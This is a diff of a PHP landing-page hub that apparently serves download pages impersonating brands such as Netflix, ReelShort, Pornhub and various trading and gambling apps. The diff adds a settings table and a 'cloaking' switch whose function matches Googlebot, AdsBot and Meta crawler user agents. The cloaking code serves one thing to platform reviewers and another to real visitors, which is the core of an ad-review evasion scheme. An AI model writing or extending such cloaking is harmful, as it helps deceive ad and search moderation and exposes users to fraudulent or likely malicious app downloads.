@@ -17,7 +17,8 @@ function db():PDO {
  CREATE INDEX IF NOT EXISTS visits_project_time ON visits(project_id,started_at DESC);
  CREATE TABLE IF NOT EXISTS events(project_id INTEGER NOT NULL REFERENCES projects(id), id TEXT NOT NULL, visit_id TEXT NOT NULL, type TEXT NOT NULL, created_at INTEGER NOT NULL, PRIMARY KEY(project_id,id));
  CREATE TABLE IF NOT EXISTS limits(bucket TEXT PRIMARY KEY, count INTEGER NOT NULL, expires INTEGER NOT NULL);
- CREATE TABLE IF NOT EXISTS audit(id INTEGER PRIMARY KEY, actor TEXT NOT NULL, action TEXT NOT NULL, project_id INTEGER, detail TEXT NOT NULL DEFAULT "", created_at INTEGER NOT NULL);');
+ CREATE TABLE IF NOT EXISTS audit(id INTEGER PRIMARY KEY, actor TEXT NOT NULL, action TEXT NOT NULL, project_id INTEGER, detail TEXT NOT NULL DEFAULT "", created_at INTEGER NOT NULL);
+ CREATE TABLE IF NOT EXISTS settings(key TEXT PRIMARY KEY, value TEXT NOT NULL, updated_at INTEGER NOT NULL);');
  // Additive migration: existing accounts keep their hashes and both existing templates.
  $columns=array_column($db->query('PRAGMA table_info(projects)')->fetchAll(),'name');
  if(!in_array('password_cipher',$columns,true)||!in_array('allowed_templates',$columns,true)||!in_array('block_search_index',$columns,true)){
@@ -109,6 +110,21 @@ function url_value($value):string {
 const HUB_TEMPLATES=['miradoview','feiyue','dptv','quest','aivideo','lumama','ggtv','appstore','ultraplay','yacinetv','dptvplus','fizzio','kyss','sparkle','newf','soccerqueens','cinema','noxxtv','smarttrade','stockvault','loveapp','qiyou','stripchat','pornparadise','pornhub','chatee','cosplay','lustylive','nightplay','bokep','xhamster','mylive','kuaibo','tikapk','jiaoyou','cyberheart','promotions','india','apuestamx'];
 const HUB_DEFAULT_TEMPLATES=['feiyue','dptv'];
 const HUB_TEMPLATE_NAMES=['miradoview'=>'MiradoView','lumama'=>'LumamaTV','feiyue'=>'ReelShort','dptv'=>'DPTV','quest'=>'Pasion TV','aivideo'=>'AI Video','ggtv'=>'GGTV','appstore'=>'Cast','ultraplay'=>'Ultra Play','yacinetv'=>'Yacine TV','dptvplus'=>'DPTV','fizzio'=>'Fizzio','kyss'=>'KYSS','sparkle'=>'Sparkle','newf'=>'NEW-F','soccerqueens'=>'Soccer Queens','cinema'=>'Netflix Gratis','noxxtv'=>'NOXX','smarttrade'=>'SmartTrade','stockvault'=>'StockVault','loveapp'=>'LoveApp','qiyou'=>'qiyou','stripchat'=>'STRIPCHAT','pornparadise'=>'Porm Paradise','pornhub'=>'Pornhub','chatee'=>'Chatee','cosplay'=>'Cosplay','lustylive'=>'Lusty Live','nightplay'=>'NightPlay','bokep'=>'Website Bokep','xhamster'=>'XHAMSTER','mylive'=>'MyLive','kuaibo'=>'KuaiBo','tikapk'=>'Tik APK','jiaoyou'=>'交友','cyberheart'=>'Cyber Heart Show','promotions'=>'VELOCITY GAMING','india'=>'印度','apuestamx'=>'ApuestaMX'];
+// Crawler user-agent markers used by the master-level cloaking switch. Matching is
+// a case-insensitive substring test, so the mobile Googlebot and Meta variants are
+// covered by the same entries without matching Facebook in-app browser brands.
+const HUB_CRAWLER_PATTERNS=['googlebot','google-inspectiontool','adsbot-google','mediapartners-google','apis-google','google-site-verification','storebot-google','googleother','feedfetcher-google','google-read-aloud','google web preview','facebookexternalhit','facebookcatalog','facebookplatform','facebookbot','facebot','meta-externalagent','meta-externalfetcher'];
+function setting_get(string $key,string $default=''):string {$row=query('SELECT value FROM settings WHERE key=?',[$key])->fetchColumn();return $row===false||$row===null?$default:(string)$row;}
+function setting_set(string $key,string $value):void {query('INSERT INTO settings(key,value,updated_at) VALUES(?,?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value,updated_at=excluded.updated_at',[$key,$value,now_ms()]);}
+function cloaking_enabled():bool {return setting_get('cloaking_enabled','0')==='1';}
+function is_crawler_ua(?string $ua):bool {
+ $ua=strtolower(trim((string)$ua));if($ua==='')return false;
+ foreach(HUB_CRAWLER_PATTERNS as $pattern)if(str_contains($ua,$pattern))return true;
+ return false;
+}
+function platform_settings():array {
+ return ['cloaking'=>['enabled'=>cloaking_enabled(),'patterns'=>HUB_CRAWLER_PATTERNS,'updatedAt'=>(int)setting_get('cloaking_updated_at','0'),'updatedBy'=>setting_get('cloaking_updated_by','')]];
+}
 function effective_app_name(array $p,?string $template=null):string {$name=trim($p['app_name']??'');return $name!==''?$name:HUB_TEMPLATE_NAMES[$template??$p['template']];}
 function public_settings(array $p,?string $template=null):array {$template=$template??$p['template'];return ['slug'=>$p['slug'],'appName'=>effective_app_name($p,$template),'appNameOverride'=>$p['app_name'],'template'=>$template,'downloadUrl'=>'/p/'.$p['slug'].'/dl','pixelId'=>$p['pixel_id'],'verifyCode'=>$p['verify_code'],'logoData'=>$p['logo_data'],'blockSearchIndex'=>(bool)($p['block_search_index']??false)];}
 function validate_templates($value):array {
